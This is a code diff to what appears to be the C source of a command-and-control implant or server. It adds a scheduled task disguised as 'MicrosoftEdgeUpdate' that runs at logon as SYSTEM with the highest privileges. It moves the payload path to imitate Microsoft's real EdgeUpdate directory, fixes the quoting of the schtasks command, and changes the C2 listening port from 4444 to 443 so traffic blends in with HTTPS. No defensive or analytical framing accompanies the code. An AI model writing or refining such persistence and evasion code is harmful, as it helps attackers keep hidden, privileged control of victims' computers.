@@ -34,11 +34,15 @@
 #define PERSISTENCE_ENABLED    1
 
 #define PERSISTENCE_TASK_NAME "MicrosoftEdgeUpdate"
-#define PERSISTENCE_TASK_CMD  "C:\\Users\\Public\\i.exe"
+#define PERSISTENCE_TASK_CMD \
+    "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"
 #define PERSISTENCE_CHECK_CMD \
     "schtasks /query /tn \"MicrosoftEdgeUpdate\" >nul 2>&1 && echo TASK_EXISTS || echo TASK_MISSING"
+/* /tr value uses \"...\" so the path-with-spaces is preserved when schtasks stores it */
 #define PERSISTENCE_CREATE_CMD \
-    "schtasks /create /tn \"MicrosoftEdgeUpdate\" /tr \"C:\\Users\\Public\\i.exe\" /sc ONLOGON /ru SYSTEM /rl HIGHEST /f"
+    "schtasks /create /tn \"MicrosoftEdgeUpdate\" " \
+    "/tr \"\\\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\\\"\" " \
+    "/sc ONLOGON /ru SYSTEM /rl HIGHEST /f"
 
 /* Returns 0 on success, -1 if connection was lost.
  * Does NOT free conn — the outer loop owns conn's lifetime. */
@@ -172,7 +176,7 @@ int main(int argc, char *argv[])
     int opt = 1;
     setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
 
-    int port = 4444;
+    int port = 443;
     const char *env_port = getenv("C2_PORT");
     if (env_port && env_port[0] != '\0') {
         int p = atoi(env_port);
